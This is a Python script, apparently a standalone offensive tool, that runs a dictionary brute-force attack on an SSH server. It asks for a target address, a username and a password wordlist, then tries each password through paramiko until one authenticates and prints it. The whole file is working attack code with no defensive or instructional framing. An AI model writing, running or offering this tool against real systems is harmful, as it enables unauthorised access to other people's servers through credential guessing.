import paramiko, sys, os, socket
import argparse
from enum import Enum

# status code returned while trying to connect to target
class Code(Enum):
	AUTHENTICATION_SUCCESSFUL = 0
	AUTHENTICATION_EXCEPTION = 1
	SSH_EXCEPTION = 2
	SOCKET_ERROR = 3

line = "\n------------------------------------------------------\n"
g_host = g_user_name = ""		# SSH connection details
g_word_list = ""				# path to the wordlist file
SSH_PORT = 22					# default SSH port
args = ""						# arguments passed in by user

"""
	get the details of the SSH server from the user
"""
def get_target_details():
	global g_host, g_user_name, g_word_list
	try:
		g_host = input("[*] Enter target's address: ")
		g_user_name = input("[*] Enter the SSH username to bruteforce: ")
		g_word_list = input("[*] Enter the path of the password-list: ")

		# check if the file exists before proceeding
		if (os.path.exists(g_word_list) == False):
			print("\n[*] Wordlist file does not exist at given path")
			sys.exit(1)

	except KeyboardInterrupt:
		print("\n [*] Program has been interrupted at your request")
		sys.exit(2)

"""
	show the entered target details
"""
def show_target_details():
	global g_host, g_user_name, g_word_list

	print(line)
	print("Target IP Address:", g_host)
	print("Username:         ", g_user_name)
	print("Wordlist Path:    ", os.path.abspath(g_word_list))
	print(line)


"""
	connect to the SSH server with the password passed as arg
"""
def connect_ssh(password):
	global g_host, g_user_name, g_word_list, args

	# create a new SSH client
	client_ssh = paramiko.SSHClient()

	# policy for automatically adding the hostname and new host key to the local HostKeys object, and saving it.
	client_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	# connect to the host with password retreived from the word list
	try:
		client_ssh.connect(g_host, SSH_PORT, g_user_name, password)
		code = Code.AUTHENTICATION_SUCCESSFUL	# successful connection

	except paramiko.AuthenticationException:
		code = Code.AUTHENTICATION_EXCEPTION	# failed authentication

	except paramiko.SSHException:
		code = Code.SSH_EXCEPTION				# error in connecting or establishing an ssh connection

	except socket.error:
		code = Code.SOCKET_ERROR				# socket error while connecting

	else:
		client_ssh.close()

	return code

"""
	tries out all the passwords in a file
"""
def ssh_brute_forcer_dictionary():
	global g_host, g_user_name, g_word_list


	print(line + "[*] Running Dictionary Attack" + line)


	# open the file containing the passwords to try
	file_words = open(g_word_list)

	# read each password from the file_words
	for password in file_words.readlines():
		password = password.strip("\n")

		try:
			response = connect_ssh(password)

			# we were able to connect successfuly to the target
			if (response == Code.AUTHENTICATION_SUCCESSFUL):
				print("{0}[*] Password found\n[*] Password: {1} {0}".format(line, password))
				sys.exit(0)

			# authentication failed
			elif (response == Code.AUTHENTICATION_EXCEPTION):
				if (args.verbose):
					print("[*] Authentication failed with password: ", password)

			# error in connecting or establishing an ssh connection
			elif (response == Code.SSH_EXCEPTION):
				print("[*] Unable to establish a connection to the target.\n")
				sys.exit(2)

			# socket error while connecting
			elif (response == Code.SOCKET_ERROR):
				print("[*] socket.error")
				sys.exit(3)

		except KeyboardInterrupt:
			print("\n [*] Program has been interrupted at your request")
			sys.exit(2)

	# no passwords matched
	file_words.close()
	print("No passwords matched")


def main():
	global args
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--verbose", help="increase output verbosity", action="store_true")
	args = parser.parse_args()

	get_target_details()
	if (args.verbose):
		show_target_details()

	ssh_brute_forcer_dictionary()

if __name__ == "__main__":
	main()

